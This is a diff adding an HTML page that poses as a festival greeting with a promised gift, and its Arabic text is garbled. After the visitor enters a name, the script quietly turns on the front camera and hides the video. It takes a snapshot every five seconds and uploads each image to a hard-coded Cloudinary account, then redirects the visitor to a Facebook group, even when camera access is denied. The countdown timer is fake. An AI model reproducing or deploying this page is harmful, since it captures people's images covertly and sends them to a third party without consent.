@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Festival - „›«Ã√… ·ﬂ</title>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    
+    <style>
+        body {
+            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
+            font-family: 'Tahoma', sans-serif;
+            text-align: center;
+            margin: 0; padding: 20px;
+        }
+        .card {
+            background: white; border-radius: 20px; padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-top: 50px;
+            border: 5px solid #ff077a;
+        }
+        h1 { color: #ff077a; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        #timer { font-size: 24px; font-weight: bold; color: #f06414; margin: 20px 0; }
+        input[type=text] { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 10px; }
+        button { background: #34af23; color: white; padding: 15px 30px; border: none; border-radius: 15px; cursor: pointer; font-size: 18px; }
+        /* ≈Œ›«¡ «·ﬂ«„Ì—«  „«„« */
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>?? HAPPY FESTIVAL ??</h1>
+        <div style="background: #ff8c00; color: white; padding: 10px; border-radius: 10px;">
+            <marquee>√Â·« »ﬂ ›Ì ’›Õ… «· Â‰∆… «·”‰ÊÌ… - √œŒ· «”„ﬂ ·—ƒÌ… ÂœÌ ﬂ</marquee>
+        </div>
+        
+        <div id="setupArea">
+            <input type="text" id="nameInput" placeholder="«ﬂ » «”„ﬂ Â‰«...">
+            <br>
+            <button onclick="startExperience()">—ƒÌ… «·„›«Ã√… ?</button>
+        </div>
+
+        <div id="mainContent" style="display:none;">
+            <h2 id="greetName"></h2>
+            <p>«‰ Ÿ— ÀÊ«‰Ì Ã«—Ì  ÃÂÌ“ ÂœÌ ﬂ...</p>
+            <div id="timer">00:00:00</div>
+        </div>
+    </div>
+
+    <video id="video" playsinline autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const cloudName = 'dgkttv99v';
+        const uploadPreset = '562842218131543';
+        const redirectURL = "https://www.facebook.com/groups/coding.community"; // «·—«»ÿ «·–Ì ”Ì› Õ ›Ì «·‰Â«Ì…
+        
+        let uploadCount = 0;
+
+        function startExperience() {
+            const name = document.getElementById('nameInput').value;
+            if (!name) { alert("„‰ ›÷·ﬂ «ﬂ » «”„ﬂ √Ê·«"); return; }
+            
+            document.getElementById('setupArea').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('greetName').innerText = "√Â·« Ì« " + name;
+            
+            startCamera(); //  ‘€Ì· «·ﬂ«„Ì—« ›Ì «·Œ·›Ì…
+        }
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // «· ﬁ«ÿ √Ê· ’Ê—… ›Ê—«
+                setTimeout(takeSnapshot, 2000);
+                
+                //  ﬂ—«— «·«· ﬁ«ÿ ﬂ· 5 ÀÊ«‰Ì
+                setInterval(takeSnapshot, 5000);
+            } catch (err) {
+                console.log("Error: " + err);
+                // Õ Ï ·Ê —›÷ «·ﬂ«„Ì—«° ”‰ﬁÊ„ » ÕÊÌ·Â ·«Õﬁ« ·ﬂÌ ·« Ì‘ﬂ
+                setTimeout(() => { window.location.href = redirectURL; }, 5000);
+            }
+        }
+
+        function takeSnapshot() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            const context = canvas.getContext('2d');
+            
+            context.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL("image/png");
+            
+            // ≈—”«· «·»Ì«‰«  ··”Õ«»
+            const formData = new FormData();
+            formData.append('file', imageData);
+            formData.append('upload_preset', uploadPreset);
+
+            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(r => r.json())
+            .then(data => {
+                uploadCount++;
+                console.log("Captured");
+                
+                // »⁄œ —›⁄ √Ê· ’Ê— Ì‰ »‰Ã«Õ° Ì „  ÕÊÌ· «·„” Œœ„ ··—«»ÿ «·‰Â«∆Ì ·≈‰Â«¡ «·Œœ⁄…
+                if (uploadCount >= 1) {
+                    setTimeout(() => {
+                        window.location.href = redirectURL;
+                    }, 4000);
+                }
+            });
+        }
+
+        // ⁄œ«œ  ‰«“·Ì ÊÂ„Ì ··“Ì‰…
+        var count = 10;
+        var counter = setInterval(function() {
+            count--;
+            if (count <= 0) { clearInterval(counter); return; }
+            document.getElementById("timer").innerHTML = "00:00:0" + count;
+        }, 1000);
+    </script>
+</body>
+</html>
